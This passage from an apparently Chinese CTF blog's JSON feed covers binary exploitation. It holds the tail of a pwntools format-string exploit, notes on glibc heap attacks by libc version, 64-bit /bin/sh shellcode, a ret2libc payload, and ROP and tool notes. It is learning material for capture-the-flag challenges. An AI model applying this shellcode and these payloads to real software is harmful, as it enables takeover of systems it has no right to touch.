\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> addr <span class=\"token operator\">+</span>  <span class=\"token number\">0xff89455c</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xff894558</span> </pre></td></tr><tr><td data-num=\"47\"></td><td><pre>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>fmth<span class=\"token punctuation\">(</span>first_offset<span class=\"token punctuation\">,</span> ret_addr<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ret_addr '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>fmt<span class=\"token punctuation\">(</span>second_offset<span class=\"token punctuation\">,</span> gadget<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\">#ready(3)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">#fmth(second_offset, gadget>>16)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"63\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20230827235654382.png\" alt=\"image-20230827235654382\"></p>\n<h2 id=\"shellcode_level3\"><a class=\"markdownIt-Anchor\" href=\"#shellcode_level3\">#</a> shellcode_level3</h2>\n<p><img data-src=\"./image-20230917214109763.png\" alt=\"image-20230917214109763\"></p>\n<p>偏移</p>\n",
            "tags": [
                "新生题",
                "short shellcode"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/08/%E5%A0%86%E6%94%BB%E5%87%BB/",
            "url": "http://waltcsz.github.io/2023/08/%E5%A0%86%E6%94%BB%E5%87%BB/",
            "title": "堆攻击",
            "date_published": "2023-08-12T10:03:25.000Z",
            "content_html": "<p><strong>堆 未完成</strong></p>\n<h1 id=\"不同bin区别\"><a class=\"markdownIt-Anchor\" href=\"#不同bin区别\">#</a> 不同 bin 区别</h1>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Fast Bin</th>\n<th>Tcache bin</th>\n<th>Small Bin</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>最小大小</td>\n<td></td>\n<td></td>\n<td>4*SIZE_SZ (16,32)</td>\n</tr>\n<tr>\n<td>每次增长</td>\n<td></td>\n<td></td>\n<td>2*SIZE_SZ</td>\n</tr>\n<tr>\n<td>最大大小</td>\n<td>默认 64 (max 80) 不含头</td>\n<td></td>\n<td>63*2*SIZE_SZ</td>\n</tr>\n<tr>\n<td>bin 数量</td>\n<td>10</td>\n<td></td>\n<td>62 (2-63)</td>\n</tr>\n<tr>\n<td>储存地址</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"libc版本区别\"><a class=\"markdownIt-Anchor\" href=\"#libc版本区别\">#</a> libc 版本区别</h1>\n<table>\n<thead>\n<tr>\n<th>libc 版本</th>\n<th>unlink</th>\n<th>tcache</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>libc6_2.23</td>\n<td>早就已经有前后块地址验证了<br />所以无法任意地址分配，只能老实 p-&gt;p-0x18</td>\n<td>无</td>\n</tr>\n<tr>\n<td>libc6_2.27-3ubuntu1_amd64</td>\n<td></td>\n<td>加入 tcache<br />dup 实现极其简单，可以直接对同一个 chunk free 两次</td>\n</tr>\n<tr>\n<td>libc6_2.27-3ubuntu1.6_amd64</td>\n<td></td>\n<td>dup 实现受阻<br />free 时循环扫描当前 bin，寻找是否有相同地址<br />这种情况下常常填充完 tcache bin 后利用 fastbin 的 double free</td>\n</tr>\n<tr>\n<td>libc6_2.29</td>\n<td>对合并的块检验 prev_size==chunksize (p)，加大了 extend 的难度</td>\n<td></td>\n</tr>\n<tr>\n<td>libc6_2.35</td>\n<td></td>\n<td>tcache 的 fd 与 heap 基地址 &gt;&gt;3 异或<br />同时 fd 后面紧接一串 key<br />对 tcache 的利用变得尤其困难</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"小知识\"><a class=\"markdownIt-Anchor\" href=\"#小知识\">#</a> 小知识</h1>\n<p>calloc 会清空内存，而 malloc 不会</p>\n<p>** <code>calloc</code> ** 不会从 tcache bin 中获取 chunk，会从 fastbin 中直接获取。同时会将 fastbin 中剩余的 chunk 添加到 tcache bin 的头部填充满。</p>\n<pre><code class=\"language-c++\">calloc(0x20);\n//等同于\nptr=malloc(0x20);\nmemset(ptr,0,0x20);\n</code></pre>\n<h1 id=\"攻击手段\"><a class=\"markdownIt-Anchor\" href=\"#攻击手段\">#</a> 攻击手段</h1>\n<h2 id=\"基础思路\"><a class=\"markdownIt-Anchor\" href=\"#基础思路\">#</a> 基础思路</h2>\n<p>泄露 libc 地址，泄露 heap 地址，利用堆块漏洞实现任意地址读写。</p>\n<h2 id=\"use-after-free\"><a class=\"markdownIt-Anchor\" href=\"#use-after-free\">#</a> use after free</h2>\n<p>用途：其他绝大多数漏洞利用的基础。</p>\n<p>同时也是大部分分配固定大小块去管理块的基础题的利用原理。</p>\n<h2 id=\"overlapping\"><a class=\"markdownIt-Anchor\" href=\"#overlapping\">#</a> overlapping</h2>\n<p>用途：其他部分漏洞利用的基础。</p>\n<h2 id=\"fastbin-attack\"><a class=\"markdownIt-Anchor\" href=\"#fastbin-attack\">#</a> fastbin attack</h2>\n<h3 id=\"double-free\"><a class=\"markdownIt-Anchor\" href=\"#double-free\">#</a> double free</h3>\n<p>用途：在有 fake size 的前提下实现任意地址读写</p>\n<h2 id=\"tcache\"><a class=\"markdownIt-Anchor\" href=\"#tcache\">#</a> tcache</h2>\n<h3 id=\"dup\"><a class=\"markdownIt-Anchor\" href=\"#dup\">#</a> dup</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI18y\">基本工作原理</span></p>\n<h2 id=\"unlink\"><a class=\"markdownIt-Anchor\" href=\"#unlink\">#</a> unlink</h2>\n<h2 id=\"unsortbin-attack\"><a class=\"markdownIt-Anchor\" href=\"#unsortbin-attack\">#</a> unsortbin attack</h2>\n<p>用途：在任意地址填充大整数，好像是 mainarena 的地址。</p>\n<p>缺点：会导致 unsortbin 损坏，导致不能再分配块。</p>\n<h2 id=\"smallbin-attack\"><a class=\"markdownIt-Anchor\" href=\"#smallbin-attack\">#</a> smallbin attack</h2>\n<h2 id=\"largebin-attack\"><a class=\"markdownIt-Anchor\" href=\"#largebin-attack\">#</a> largebin attack</h2>\n",
            "tags": [
                "heap"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/07/pwn%E5%9F%BA%E7%A1%80/",
            "url": "http://waltcsz.github.io/2023/07/pwn%E5%9F%BA%E7%A1%80/",
            "title": "pwn基础",
            "date_published": "2023-07-20T09:00:23.000Z",
            "content_html": "<h1 id=\"栈\"><a class=\"markdownIt-Anchor\" href=\"#栈\">#</a> 栈</h1>\n<h2 id=\"传参\"><a class=\"markdownIt-Anchor\" href=\"#传参\">#</a> 传参</h2>\n<h3 id=\"64位\"><a class=\"markdownIt-Anchor\" href=\"#64位\">#</a> 64 位</h3>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>寄存器</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>1</strong></td>\n<td><strong>rdi</strong></td>\n</tr>\n<tr>\n<td><strong>2</strong></td>\n<td><strong>rsi</strong></td>\n</tr>\n<tr>\n<td>3</td>\n<td>rdx</td>\n</tr>\n<tr>\n<td>4</td>\n<td>rcx</td>\n</tr>\n<tr>\n<td>5</td>\n<td>r8</td>\n</tr>\n<tr>\n<td>6</td>\n<td>r9</td>\n</tr>\n<tr>\n<td>7+</td>\n<td>从右向左压入栈中</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"ropgadget\"><a class=\"markdownIt-Anchor\" href=\"#ropgadget\">#</a> ROPgadget</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ROPgadget <span class=\"token parameter variable\">--binary</span> pwn <span class=\"token parameter variable\">--only</span> <span class=\"token string\">'pop|ret'</span></pre></td></tr></table></figure><h2 id=\"shellcode\"><a class=\"markdownIt-Anchor\" href=\"#shellcode\">#</a> shellcode</h2>\n<p>64 位</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token string\">b\"\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x04\\x3b\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x52\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\"</span></pre></td></tr></table></figure><h2 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc</h2>\n<h3 id=\"64位-2\"><a class=\"markdownIt-Anchor\" href=\"#64位-2\">#</a> 64 位</h3>\n<p>写 system 和 binsh 时可能需要在前面加 ret</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"栈迁移\"><a class=\"markdownIt-Anchor\" href=\"#栈迁移\">#</a> 栈迁移</h2>\n<p>栈迁移大致在以下情况使用：</p>\n<ul>\n<li>栈空间太小不足以用来攻击</li>\n<li>为了利用缓冲区溢出攻击某些地址（待验证）</li>\n<li>迁移至.bss 段上确保权限足够</li>\n</ul>\n<p>函数返回时将栈中旧 ebp 弹入 ebp 寄存器，而对旧 ebp 进行伪造可以将栈底迁移至构造的 fake_stage，再次利用 ROP 执行 leave, ret 可以将 ebp 弹入 esp，实现完整的栈迁移。</p>\n<h2 id=\"ret2dlresolve\"><a class=\"markdownIt-Anchor\" href=\"#ret2dlresolve\">#</a> ret2dlresolve</h2>\n<h2 id=\"汇编\"><a class=\"markdownIt-Anchor\" href=\"#汇编\">#</a> 汇编</h2>\n<pre><code>lea eax, [addr]\t//将addr的\n</code></pre>\n<h1 id=\"全局变量位置\"><a class=\"markdownIt-Anchor\" href=\"#全局变量位置\">#</a> 全局变量位置</h1>\n<h2 id=\"libcso\"><a class=\"markdownIt-Anchor\" href=\"#libcso\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL2xpYmMuc28=\">libc.so</span></h2>\n<ul>\n<li><code>main_arena</code> : 存放各种 bin 的头</li>\n<li><code>_IO_list_all</code> :</li>\n<li></li>\n</ul>\n<h2 id=\"程序\"><a class=\"markdownIt-Anchor\" href=\"#程序\">#</a> 程序</h2>\n<ul>\n<li><code>fini_array</code></li>\n</ul>\n<h2 id=\"堆\"><a class=\"markdownIt-Anchor\" href=\"#堆\">#</a> 堆</h2>\n<ul>\n<li>tcache 存放 tcache bin</li>\n<li><code>_IO_FILE_plus</code> : fopen 打开的文件</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/07/pwn%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8F%8A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/",
            "url": "http://waltcsz.github.io/2023/07/pwn%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8F%8A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/",
            "title": "pwn常用工具及环境配置",
            "date_published": "2023-07-19T14:59:36.000Z",
            "content_html": "<h1 id=\"环境\"><a class=\"markdownIt-Anchor\" href=\"#环境\">#</a> 环境</h1>\n<h2 id=\"python\"><a class=\"markdownIt-Anchor\" href=\"#python\">#</a> python</h2>\n<h3 id=\"str和bytes转换\"><a class=\"markdownIt-Anchor\" href=\"#str和bytes转换\">#</a> str 和 bytes 转换</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>B <span class=\"token operator\">=</span> S<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#可忽略参数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>S <span class=\"token operator\">=</span> B<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>B <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">,</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#不可忽略参数</span></pre></td></tr></table></figure><h3 id=\"字符串替换\"><a class=\"markdownIt-Anchor\" href=\"#字符串替换\">#</a> 字符串替换</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dynstr <span class=\"token operator\">=</span> dynstr<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"checksec\"><a class=\"markdownIt-Anchor\" href=\"#checksec\">#</a> checksec</h2>\n<ul>\n<li>RELRO got 表写权限 Partial RELRO 代表具有写权限</li>\n<li>stack canary 栈溢出保护</li>\n<li>NX：No-eXecute 不可执行保护</li>\n<li>PIE（ASLR）内存地址随机化 代码地址前几位随机 后几位固定</li>\n</ul>\n<h2 id=\"pwntools\"><a class=\"markdownIt-Anchor\" href=\"#pwntools\">#</a> PWNtools</h2>\n<h3 id=\"常用命令\"><a class=\"markdownIt-Anchor\" href=\"#常用命令\">#</a> 常用命令</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span>\t\t<span class=\"token comment\">#python 调试</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x080323'</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#gdb 动态调试</span></pre></td></tr></table></figure><h3 id=\"elf\"><a class=\"markdownIt-Anchor\" href=\"#elf\">#</a> elf</h3>\n<p>当拥有 libc 文件时，利用 ret2libc 寻找 /bin/sh 字符串</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>libc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>binsh <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>获取.dynstr 段的数据</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dynstr <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>get_section_by_name<span class=\"token punctuation\">(</span><span class=\"token string\">'.dynstr'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"libcsearcher\"><a class=\"markdownIt-Anchor\" href=\"#libcsearcher\">#</a> LibcSearcher</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#获取__libc_start_main 的真实地址储存至 lsm_a</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#参数 1 为字符串，函数名，参数 2 为地址</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"rop\"><a class=\"markdownIt-Anchor\" href=\"#rop\">#</a> ROP</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU0MjE4ODMzL2FydGljbGUvZGV0YWlscy8xMzA0MjY0MDQ=\">详细的资料</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>rop<span class=\"token operator\">=</span>ROP<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">,</span>base<span class=\"token operator\">=</span><span class=\"token number\">0x400000</span><span class=\"token punctuation\">,</span>badchars<span class=\"token operator\">=</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#一般只需第一个参数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t<span class=\"token comment\">#返回 bytes 数据</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>rop<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">(</span>resolvable<span class=\"token punctuation\">,</span> arguments<span class=\"token punctuation\">:</span> <span class=\"token builtin\">list</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t<span class=\"token comment\">#加入某函数调用</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span>\t\t\t\t\t\t\t\t\t<span class=\"token comment\">#直接填充一个值</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>rop<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t<span class=\"token comment\">#用好看的方式打印构造后</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rop<span class=\"token punctuation\">.</span>migrate<span class=\"token punctuation\">(</span>next_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>rop<span class=\"token punctuation\">.</span>resolve<span class=\"token punctuation\">(</span>resolvable<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>rop<span class=\"token punctuation\">.</span>ret2csu<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> edi<span class=\"token operator\">=</span>Padding<span class=\"token punctuation\">(</span>‘edi’<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rsi<span class=\"token operator\">=</span>Padding<span class=\"token punctuation\">(</span>‘rsi’<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdx<span class=\"token operator\">=</span>Padding<span class=\"token punctuation\">(</span>‘rdx’<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rbx<span class=\"token operator\">=</span>Padding<span class=\"token punctuation\">(</span>‘rbx’<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rbp<span class=\"token operator\">=</span>Padding<span class=\"token punctuation\">(</span>‘rbp’<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> r12<span class=\"token operator\">=</span>Padding<span class=\"token punctuation\">(</span>‘r12’<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> r13<span class=\"token operator\">=</span>Padding<span class=\"token punctuation\">(</span>‘r13’<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> r14<span class=\"token operator\">=</span>Padding<span class=\"token punctuation\">(</span>‘r14’<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> r15<span class=\"token operator\">=</span>Padding<span class=\"token punctuation\">(</span>‘r15’<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> call<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>rop <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">(</span><span class=\"token string\">\"./main_no_relro_64\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>rop<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">(</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> bss_base<span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x600988</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000400771</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>stack_size<span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"gdb\"><a class=\"markdownIt-Anchor\" href=\"#gdb\">#</a> GDB</h2>\n<ul>\n<li>\n<p>l</p>\n</li>\n<li>\n<p>b *0x999</p>\n<p>b func</p>\n<p>断点</p>\n</li>\n<li>\n<p>p func</p>\n<p>print 打印变量内容</p>\n</li>\n<li>\n<p>x /80wg 0x9323454</p>\n<p>读取内存内容 单位数 字节 单位字节数</p>\n</li>\n<li>\n<p>vmmap</p>\n</li>\n</ul>\n<h3 id=\"objdump\"><a class=\"markdownIt-Anchor\" href=\"#objdump\">#</a> objdump</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>objdump <span class=\"token parameter variable\">-d</span> <span class=\"token parameter variable\">-j</span> .plt pwn\t<span class=\"token comment\">#查看.plt 表</span></pre></td></tr></table></figure>",
            "tags": [
                "工具"
            ]
        }
    ]
}